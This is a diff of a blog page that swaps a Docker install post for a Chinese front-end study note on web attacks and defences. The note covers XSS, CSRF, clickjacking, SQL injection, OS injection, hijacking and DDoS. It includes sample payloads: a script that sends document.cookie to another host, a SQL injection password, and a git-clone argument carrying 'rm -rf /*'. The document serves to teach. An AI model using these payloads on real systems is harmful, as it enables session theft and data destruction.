@@ -22,22 +22,20 @@
     var CONFIG = {"hostname":"wzhichi.gitee.io","root":"/","scheme":"Gemini","version":"8.0.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeIn","post_body":"fadeIn","coll_header":"fadeIn","sidebar":"fadeIn"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}};
   </script>
 
-  <meta name="description" content="前言 记录一下在云服务器上安装Docker过程。">
+  <meta name="description" content="前言 随着互联网的发展，涉及网络安全的问题不可忽视，而作为一名前端工程师，了解网络安全相关的知识也是有必要的，在这里对一些常见的web安全问题及防御手段做个简单的笔记整理。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Docker安装">
-<meta property="og:url" content="https://wzhichi.gitee.io/2020/09/08/Docker%E5%AE%89%E8%A3%85/index.html">
+<meta property="og:title" content="web安全问题及防御">
+<meta property="og:url" content="https://wzhichi.gitee.io/2020/09/13/web%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%8F%8A%E9%98%B2%E5%BE%A1/index.html">
 <meta property="og:site_name" content="韦枝池的博客">
-<meta property="og:description" content="前言 记录一下在云服务器上安装Docker过程。">
+<meta property="og:description" content="前言 随着互联网的发展，涉及网络安全的问题不可忽视，而作为一名前端工程师，了解网络安全相关的知识也是有必要的，在这里对一些常见的web安全问题及防御手段做个简单的笔记整理。">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-09-08T11:53:21.000Z">
-<meta property="article:modified_time" content="2020-09-09T12:55:49.238Z">
+<meta property="article:published_time" content="2020-09-13T03:13:12.000Z">
+<meta property="article:modified_time" content="2020-09-13T03:16:46.048Z">
 <meta property="article:author" content="JackeyW">
-<meta property="article:tag" content="docker">
-<meta property="article:tag" content="部署">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="https://wzhichi.gitee.io/2020/09/08/Docker%E5%AE%89%E8%A3%85/">
+<link rel="canonical" href="https://wzhichi.gitee.io/2020/09/13/web%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%8F%8A%E9%98%B2%E5%BE%A1/">
 
 
 <script class="page-configurations">
@@ -50,7 +48,7 @@
   };
 </script>
 
-  <title>Docker安装 | 韦枝池的博客</title>
+  <title>web安全问题及防御 | 韦枝池的博客</title>
   
 
 
@@ -209,7 +207,7 @@
       </ul>
       <!--noindex-->
       <section class="post-toc-wrap sidebar-panel">
-          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E9%80%89%E6%8B%A9%E5%9B%BD%E5%86%85%E7%9A%84%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%95%86%EF%BC%8C%E8%BF%99%E9%87%8C%E9%80%89%E6%8B%A9%E9%98%BF%E9%87%8C%E4%BA%91%E4%B8%BA%E4%BE%8B"><span class="nav-text">1.选择国内的云服务商，这里选择阿里云为例</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E5%AE%89%E8%A3%85%E6%89%80%E9%9C%80%E8%A6%81%E7%9A%84%E5%8C%85"><span class="nav-text">2.安装所需要的包</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-%E6%B7%BB%E5%8A%A0%E4%BD%BF%E7%94%A8-HTTPS-%E4%BC%A0%E8%BE%93%E7%9A%84%E8%BD%AF%E4%BB%B6%E5%8C%85%E4%BB%A5%E5%8F%8A-CA-%E8%AF%81%E4%B9%A6"><span class="nav-text">3.添加使用 HTTPS 传输的软件包以及 CA 证书</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-%E6%B7%BB%E5%8A%A0GPG%E5%AF%86%E9%92%A5"><span class="nav-text">4.添加GPG密钥</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-%E6%B7%BB%E5%8A%A0%E8%BD%AF%E4%BB%B6%E6%BA%90"><span class="nav-text">5.添加软件源</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-%E6%B7%BB%E5%8A%A0%E6%88%90%E5%8A%9F%E5%90%8E%E6%9B%B4%E6%96%B0%E8%BD%AF%E4%BB%B6%E5%8C%85%E7%BC%93%E5%AD%98"><span class="nav-text">6.添加成功后更新软件包缓存</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#7-%E5%AE%89%E8%A3%85docker"><span class="nav-text">7.安装docker</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#8-%E5%90%AF%E5%8A%A8-docker"><span class="nav-text">8.启动 docker</span></a></li></ol></div>
+          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1%E3%80%81XSS%E6%94%BB%E5%87%BB-%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E2%80%93cross-site-scripting"><span class="nav-text">1、XSS攻击(跨站点脚本攻击–cross site scripting)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2%E3%80%81CSRF%E6%94%BB%E5%87%BB-%E8%B7%A8%E7%AB%99%E4%BC%AA%E9%80%A0%E8%AF%B7%E6%B1%82%E2%80%93cross-site-request-forgery"><span class="nav-text">2、CSRF攻击(跨站伪造请求–cross site request forgery)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3%E3%80%81%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81-clickjacking"><span class="nav-text">3、点击劫持(clickjacking)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4%E3%80%81SQL%E6%B3%A8%E5%85%A5"><span class="nav-text">4、SQL注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5%E3%80%81OS%E6%B3%A8%E5%85%A5"><span class="nav-text">5、OS注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6%E3%80%81%E8%AF%B7%E6%B1%82%E5%8A%AB%E6%8C%81"><span class="nav-text">6、请求劫持</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#7%E3%80%81DDOS%E6%94%BB%E5%87%BB-%E5%88%86%E5%B8%83%E5%BC%8F%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%E2%80%93distributed-denial-of-service"><span class="nav-text">7、DDOS攻击(分布式拒绝服务攻击–distributed denial of service)</span></a></li></ol></div>
       </section>
       <!--/noindex-->
       <section class="site-overview-wrap sidebar-panel">
@@ -310,7 +308,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://wzhichi.gitee.io/2020/09/08/Docker%E5%AE%89%E8%A3%85/">
+    <link itemprop="mainEntityOfPage" href="https://wzhichi.gitee.io/2020/09/13/web%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%8F%8A%E9%98%B2%E5%BE%A1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avator.png">
@@ -326,7 +324,7 @@
     
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Docker安装
+          web安全问题及防御
         </h1>
 
         <div class="post-meta-container">
@@ -337,16 +335,7 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2020-09-08 19:53:21" itemprop="dateCreated datePublished" datetime="2020-09-08T19:53:21+08:00">2020-09-08</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E9%83%A8%E7%BD%B2%E8%BF%90%E7%BB%B4/" itemprop="url" rel="index"><span itemprop="name">部署运维</span></a>
-        </span>
+      <time title="创建时间：2020-09-13 11:13:12" itemprop="dateCreated datePublished" datetime="2020-09-13T11:13:12+08:00">2020-09-13</time>
     </span>
 
   
@@ -367,26 +356,155 @@
     
     <div class="post-body" itemprop="articleBody">
         <h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
-<p>记录一下在云服务器上安装Docker过程。</p>
+<p>随着互联网的发展，涉及网络安全的问题不可忽视，而作为一名前端工程师，了解网络安全相关的知识也是有必要的，在这里对一些常见的web安全问题及防御手段做个简单的笔记整理。</p>
 </blockquote>
 <a id="more"></a>
 
-<h5 id="1-选择国内的云服务商，这里选择阿里云为例"><a href="#1-选择国内的云服务商，这里选择阿里云为例" class="headerlink" title="1.选择国内的云服务商，这里选择阿里云为例"></a>1.选择国内的云服务商，这里选择阿里云为例</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL http:<span class="comment">//acs-public-mirror.oss-cn-hangzhou.aliyuncs.com/docker-engine/internet | sh -</span></span><br></pre></td></tr></table></figure>
-<h5 id="2-安装所需要的包"><a href="#2-安装所需要的包" class="headerlink" title="2.安装所需要的包"></a>2.安装所需要的包</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install linux-image-extra-$(uname -r) linux-image-extra-virtual</span><br></pre></td></tr></table></figure>
+<h5 id="1、XSS攻击-跨站点脚本攻击–cross-site-scripting"><a href="#1、XSS攻击-跨站点脚本攻击–cross-site-scripting" class="headerlink" title="1、XSS攻击(跨站点脚本攻击–cross site scripting)"></a>1、XSS攻击(跨站点脚本攻击–cross site scripting)</h5><p>通过存在安全漏洞的web网站注册用户的浏览器内运行非法的HTML标签或Javascript进行的一种攻击。</p>
+<pre><code>通常会找那些输入框或者地址参数栏进行测试，看是否能执行脚本，是否存在漏洞
+例如
+    http://localhost:3000?from=china;
+修改成
+    http://localhost:3000?from=&lt;script&gt;alert(1)&lt;/script&gt;
 
-<h5 id="3-添加使用-HTTPS-传输的软件包以及-CA-证书"><a href="#3-添加使用-HTTPS-传输的软件包以及-CA-证书" class="headerlink" title="3.添加使用 HTTPS 传输的软件包以及 CA 证书"></a>3.添加使用 HTTPS 传输的软件包以及 CA 证书</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update sudo apt-get install apt-transport-https ca-certificates</span><br></pre></td></tr></table></figure>
+如果有弹出框，证明存在漏洞，可以插入脚本进行攻击
 
-<h5 id="4-添加GPG密钥"><a href="#4-添加GPG密钥" class="headerlink" title="4.添加GPG密钥"></a>4.添加GPG密钥</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-key adv --keyserver hkp:<span class="comment">//p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D</span></span><br></pre></td></tr></table></figure>
+例如
+    http://localhost:3000?from=&lt;script src=&quot;http://localhost:4000/getImg.js&quot;&gt;&lt;/script&gt;
 
-<h5 id="5-添加软件源"><a href="#5-添加软件源" class="headerlink" title="5.添加软件源"></a>5.添加软件源</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&quot;deb https://apt.dockerproject.org/repo ubuntu-xenial main&quot;</span> | sudo tee /etc/apt/sources.list.d/docker.list</span><br></pre></td></tr></table></figure>
+getImg.js如下:
+    let img=new Image();
+    img.src&quot;http://localhost:4000?cookie=document.cookie&quot;;
 
-<h5 id="6-添加成功后更新软件包缓存"><a href="#6-添加成功后更新软件包缓存" class="headerlink" title="6.添加成功后更新软件包缓存"></a>6.添加成功后更新软件包缓存</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
+这样 http://localhost:4000就能通过图片的请求处理拿到客户端的cookie
+    let cookie=req.cookie;
+    console.log(cookie);
 
-<h5 id="7-安装docker"><a href="#7-安装docker" class="headerlink" title="7.安装docker"></a>7.安装docker</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install docker-engine</span><br></pre></td></tr></table></figure>
+XSS的危害:
+    1、获取页面数据
+    2、获取cookies
+    3、发送请求
+    4、劫持前端逻辑
+    5、偷取网站的任意数据
+    6、偷取用户的资料
+    7、偷取用户的秘密和登录态
+    8、欺骗用户
 
-<h5 id="8-启动-docker"><a href="#8-启动-docker" class="headerlink" title="8.启动 docker"></a>8.启动 docker</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl enable docker sudo systemctl start docker</span><br></pre></td></tr></table></figure>
+防御手段:
+1、响应头部字段X-Xss-Protection
+    0：禁止XSS过滤
+    1:启用XSS过滤，浏览器默认启用，如果检测到攻击，浏览器将清除页面(删除不安全的部分)
+    1;mode=block启用XSS过滤，如果检测到攻击，浏览器将不会清除页面，而是阻塞页面加载
+    1;report=(Chromium  only)
+    启用XSS过滤。如果检测到跨站脚本攻击，浏览器将清除⻚⾯并使⽤CSP report-uri 指令的功能发送违规报告。
+2、ejs转义 
+    &lt;% code %&gt;用于执行其中javascript代码
+    &lt;%= code %&gt;会对code进行html转义
+    &lt;%- code %&gt;将不会进行转义
 
+3、CSP(Content Security Policy) 内容安全策略
+    script-src:&#39;self-src&#39;
 
+4、转义字符
+
+5、黑名单和白名单
+用户的输入永远不可信任的，最普遍的做法就是转义输⼊输出的内容，对于引号、尖括号、斜
+杠进行转义富文本来说，显然不能通过上⾯的办法来转义所有字符，因为这样会把需要的格式也过滤掉。
+对于这种情况，通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过
+滤的标签和标签属性实在太多，更加推荐使用白名单的方式
+
+6、响应头部字段Set-Cookie 设置为HttpOnly  客户端就不能通过document.cookie访问到cookie了
+    例如:
+        res.setHeader(&#39;Set-Cookit&#39;,&#39;uid=123; HttpOnly&#39;)</code></pre>
+<h5 id="2、CSRF攻击-跨站伪造请求–cross-site-request-forgery"><a href="#2、CSRF攻击-跨站伪造请求–cross-site-request-forgery" class="headerlink" title="2、CSRF攻击(跨站伪造请求–cross site request forgery)"></a>2、CSRF攻击(跨站伪造请求–cross site request forgery)</h5><p>利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。</p>
+<pre><code>1、用户已经登录了站点 A，并在本地记录了 cookie
+2、在用户没有登出站点 A 的情况下（也就是 cookie 有效的情况下），访问了恶意攻击者提供的引
+诱危险站点 B (B 站点要求访问站点A)。
+3、站点 A 没有做任何 CSRF 防御
+
+CSRF的危害：
+    1、利用用户登录态
+    2、用户不知情
+    3、完成业务请求
+    4、盗取用户资金（转账，消费）
+    5、冒充用户发帖背锅
+    6、损害用站声誉
+
+防御手段:
+    1、referer check  校验来源  但是https不显示referer 而且可伪造
+    2、验证码(最有效)</code></pre>
+<h5 id="3、点击劫持-clickjacking"><a href="#3、点击劫持-clickjacking" class="headerlink" title="3、点击劫持(clickjacking)"></a>3、点击劫持(clickjacking)</h5><p>点击劫持是一种视觉欺骗的攻击手段。攻击者将需要攻击的网站通过 iframe 嵌套的方式式嵌入自己<br>的网页中，并将 iframe 设置为透明，在页面中透出一个按钮诱导用户点击</p>
+<pre><code>通过视觉欺骗手段将引诱点击的按钮和iframe的网站提交按钮重叠
+
+防御手段：
+1、响应头字段X-IFRAME-OPTIONS
+    DENY,表示页面不允许通过iframe的方式展示
+    SAMEORIGIN，表示页面可以在相同域名下通过iframe的方式展示
+    ARROW-FROM，表示页面可以在指定来源的iframe中显示
+
+    res.setHeader(&#39;X-FRAME-OPTIONS&#39;,&#39;DENY)
+
+    防御用 iframe 嵌套的点击劫持攻击
+
+2、JS方式(古老的手段)
+    判断self是否和top相等
+    如果相等，则没事，
+    如果不相等，则为通过iframe来访问的，
+    让top.location=self.location</code></pre>
+<h5 id="4、SQL注入"><a href="#4、SQL注入" class="headerlink" title="4、SQL注入"></a>4、SQL注入</h5><p>SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</p>
+<p>例如特殊”密码”：1’or’1’=’1’</p>
+<pre><code>// 拼接后的SQL
+SELECT *
+FROM test.user
+WHERE username = &#39;laowang&#39;
+AND password = &#39;1&#39;or&#39;1&#39;=&#39;1&#39;
+
+用or达到一个怎么都正确的结果
+
+防御手段:
+1、所有的查询语句建议使用数据库提供的参数化查询接口**，参数化的语句使用参数而不是将用户
+输入变量嵌入到 SQL 语句中，即不要直接拼接 SQL 语句。例如 Node.js 中的 mysqljs 库的
+query 方法中的 ? 占位参数。
+2、严格限制Web应用的数据库的操作权限**，给此用户提供仅仅能够满足其工作的最低权限，从而
+最大限度的减少注入攻击对数据库的危害
+3、后端代码检查输入的数据是否符合预期**，严格限制变量的类型，例如使用正则表达式进行一些
+匹配处理。
+4、对进入数据库的特殊字符（&#39;， &quot;， \， &lt;， &gt;， &amp;， *， ; 等）进行转义处理，或编码转换**。基本上
+所有的后端语言都有对字符串进行转义处理的方法，例如 lodash 的 lodash._escapehtmlchar
+库</code></pre>
+<h5 id="5、OS注入"><a href="#5、OS注入" class="headerlink" title="5、OS注入"></a>5、OS注入</h5><pre><code>和SQL差不多，不过是针对操作系统的
+// 以 Node.js 为例，假如在接口中需要从 github 下载用户指定的 repo
+const exec = require(&#39;mz/child_process&#39;).exec;
+let params = &#123;/* 用户输入的参数 */&#125;;
+exec(`git clone $&#123;params.repo&#125; /some/path`);
+
+https://github.com/xx/xx.git &amp;&amp; rm -rf /* &amp;&amp;</code></pre>
+<h5 id="6、请求劫持"><a href="#6、请求劫持" class="headerlink" title="6、请求劫持"></a>6、请求劫持</h5><ul>
+<li><p>DNS劫持</p>
+<blockquote>
+<p>顾名思义， DNS服务器(DNS解析各个步骤)被篡改，修改了域名解析的结果，使得访问到的不是预期的ip</p>
+</blockquote>
+</li>
+<li><p>HTTP劫持 </p>
+<blockquote>
+<p>运营商劫持，此时大概只能升级HTTPS了</p>
+</blockquote>
+<p>  防御手段：    </p>
+<pre><code>  使用https安全协议</code></pre>
+</li>
+</ul>
+<h5 id="7、DDOS攻击-分布式拒绝服务攻击–distributed-denial-of-service"><a href="#7、DDOS攻击-分布式拒绝服务攻击–distributed-denial-of-service" class="headerlink" title="7、DDOS攻击(分布式拒绝服务攻击–distributed denial of service)"></a>7、DDOS攻击(分布式拒绝服务攻击–distributed denial of service)</h5><p>DDOS 不是一种攻击，而是一大类攻击的总称。它有几十种类型，新的攻击方法还在不断发明出来。网站站运行的各个环节，都可以是攻击目标。只要把一个环节攻破，使得整个流程跑不起来，就达到了瘫痪服务的目的。</p>
+<pre><code>其中，比较常见的一种攻击是 cc 攻击。它就是简单粗暴地送来⼤量正常的请求，超出服务器的最⼤承
+受量，导致宕机。
+
+防御手段：
+    1、备份网站
+    备份网站不一定是全功能的，如果能做到全静态浏览，就能满足需求。最低限度应该可以显示公
+    告，告诉用户，网站出了问题，正在全力抢修。
+    2、HTTP 请求的拦截
+    3、硬件 服务器 防火墙
+    - 带宽扩容 + CDN
+    提高犯罪成本</code></pre>
 
     </div>
 
@@ -406,16 +524,16 @@
 
           <li class="post-copyright-link">
             <strong>本文标题：</strong>
-            <a href="https://wzhichi.gitee.io/2020/09/08/Docker%E5%AE%89%E8%A3%85/" title="Docker安装">Docker安装</a>
+            <a href="https://wzhichi.gitee.io/2020/09/13/web%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%8F%8A%E9%98%B2%E5%BE%A1/" title="web安全问题及防御">web安全问题及防御</a>
           </li>
 
           <li class="post-copyright-link">
             <strong>本文链接：</strong>
-            <a href="https://wzhichi.gitee.io/2020/09/08/Docker%E5%AE%89%E8%A3%85/" title="Docker安装">https://wzhichi.gitee.io/2020/09/08/Docker%E5%AE%89%E8%A3%85/</a>
+            <a href="https://wzhichi.gitee.io/2020/09/13/web%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%8F%8A%E9%98%B2%E5%BE%A1/" title="web安全问题及防御">https://wzhichi.gitee.io/2020/09/13/web%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%8F%8A%E9%98%B2%E5%BE%A1/</a>
           </li>
 
           <li class="post-copyright-date">
-              <strong>发布时间：</strong>2020年9月8日 - 19时09分
+              <strong>发布时间：</strong>2020年9月13日 - 11时09分
           </li>  
 
           <li class="post-copyright-license">
@@ -425,23 +543,16 @@
         </ul>
       
     </div>
-          <div class="post-tags">
-              <a href="/tags/docker/" rel="tag"># docker</a>
-              <a href="/tags/%E9%83%A8%E7%BD%B2/" rel="tag"># 部署</a>
-          </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2020/09/07/Git%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/" rel="prev" title="Git使用总结">
-                  <i class="fa fa-chevron-left"></i> Git使用总结
+                <a href="/2020/09/12/Linux%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/" rel="prev" title="Linux基础知识点整理">
+                  <i class="fa fa-chevron-left"></i> Linux基础知识点整理
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2020/09/09/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE%E5%BA%93IndexDB%E5%85%A5%E9%97%A8/" rel="next" title="浏览器数据库IndexDB入门">
-                  浏览器数据库IndexDB入门 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
